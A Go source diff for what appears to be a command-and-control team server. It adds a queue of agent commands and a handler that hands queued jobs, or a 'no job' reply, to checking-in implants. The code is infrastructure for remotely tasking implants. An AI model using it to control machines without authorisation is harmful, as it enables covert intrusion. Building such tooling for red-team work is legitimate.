@@ -9,7 +9,6 @@ import (
 	"AllSecure/ListeningServer/Common"
 	"AllSecure/TeamServer/Crypt"
 	"context"
-	"encoding/binary"
 	"github.com/gin-gonic/gin"
 	"io"
 	"log"
@@ -23,8 +22,9 @@ type LS struct {
 }
 
 var (
-	agent_arr   []Common.Implant
-	g_clientobj Common.Client
+	agent_arr      []Common.Implant
+	g_clientobj    Common.Client
+	gAgentCmdQueue Common.Queue
 )
 
 func ProcessRequest(c *gin.Context) {
@@ -46,8 +46,7 @@ func ProcessRequest(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 
-	var CMDID = binary.BigEndian.Uint32(data_package.CmdID)
-	switch CMDID {
+	switch data_package.CmdID {
 	case Common.CMD_Register:
 		var (
 			NewImplant Common.Implant
@@ -81,8 +80,35 @@ func ProcessRequest(c *gin.Context) {
 		break //CMD_Register
 
 	case Common.CMD_GET_JOB:
-		//TODO PARSE DATA THEN SEND JOB FUNCTION WAITING TO AGENT
-		log.Println("[info] in GET JOB")
+		//TODO WRITE THE DATA PARSER FOR DATA WE RECEIVE DURING CHECKIN.
+
+		if len(gAgentCmdQueue) == 0 {
+			var (
+				AgentCmd Common.AgentCmd
+			)
+			AgentCmd.CmdID = Common.CMD_NO_JOB
+			AgentCmd.RequestID = data_package.RequestID + 1
+
+			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
+		} else {
+			var (
+				AgentCmd Common.AgentCmd
+				value    interface{}
+				ok       bool
+			)
+			value, err = gAgentCmdQueue.Dequeue()
+			if err != nil {
+				log.Println("[error] attempting to dequeue agent command", err)
+				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+			}
+			if AgentCmd, ok = value.(Common.AgentCmd); ok {
+				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
+			} else {
+				log.Println("[error] attempting to cast value to AgentCmd")
+				c.Data(http.StatusInternalServerError, "application/octet-stream", nil)
+			}
+
+		}
 		break
 
 	default:
